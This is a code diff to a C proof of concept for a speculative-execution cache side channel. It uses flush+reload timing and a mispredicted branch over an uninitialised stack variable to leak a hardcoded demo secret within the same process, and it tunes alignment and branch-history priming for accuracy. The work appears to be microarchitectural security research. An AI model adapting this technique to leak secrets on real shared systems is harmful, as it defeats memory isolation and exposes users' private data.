@@ -14,35 +14,35 @@
 #define SECRET "mysecret"
 #define false 0
 #define true  1
-#define DBG 0
-#define MALLOC_SIZE 4096
-
-#define ALIGNED_SIZE 4096
+#define DBG 1
+#define CL_SIZE 64      //CACHE LINE SIZE
+#define CP_SIZE 4096    //CACHE PAGE SIZE
 
 cp_t* flush_reload_arr;
 volatile cp_t cp;   //cache page declared out of function to keep stack of uninit_func() identical to init_func()
-int __attribute__((aligned(ALIGNED_SIZE))) init_bool_copy;
 
 void touch_secret(int secret_index) {
-    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) s = SECRET[secret_index];
+    volatile char __attribute__ ((aligned (CP_SIZE))) s = SECRET[secret_index];
     if(DBG)printf("secret\t%p:\t%d\n", &s, s);
 }
 
 void init_func(int val) {
-    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
-    if(DBG)printf("init  \t%p:\t%d\n", &x, x);
+    volatile char __attribute__ ((aligned (CP_SIZE))) init = val;
+    if(DBG)printf("init  \t%p:\t%d\n", &init, init);
 }
 
 void uninit_func() {
-    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
-    cp = flush_reload_arr[x];
-    if(DBG)printf("uninit\t%p:\t%d\n", &x, x);
+    volatile char __attribute__ ((aligned (CP_SIZE))) uninit;
+    cp = flush_reload_arr[uninit];
+    if(DBG)printf("uninit\t%p:\t%d\n", &uninit, uninit);
 }
 
 void victim_func(char init_bool, int secret_index) {
     if(init_bool)touch_secret(secret_index);
+    //increase branch history for better accuracy
     for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}
-    init_bool_copy = init_bool;
+
+    int init_bool_copy __attribute__((aligned(CL_SIZE))) = init_bool;
     int val = 5;
 
     flush(&init_bool_copy);
@@ -50,7 +50,6 @@ void victim_func(char init_bool, int secret_index) {
 
     if(init_bool_copy) init_func(val);
     else               uninit_func();
-
 }
 
 int* prepare(int secret_index) {
@@ -97,6 +96,4 @@ int main(int argc, char** argv) {
     print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);
 
     free_results(results, REPETITIONS, SECRET_SIZE);
-
-
 }
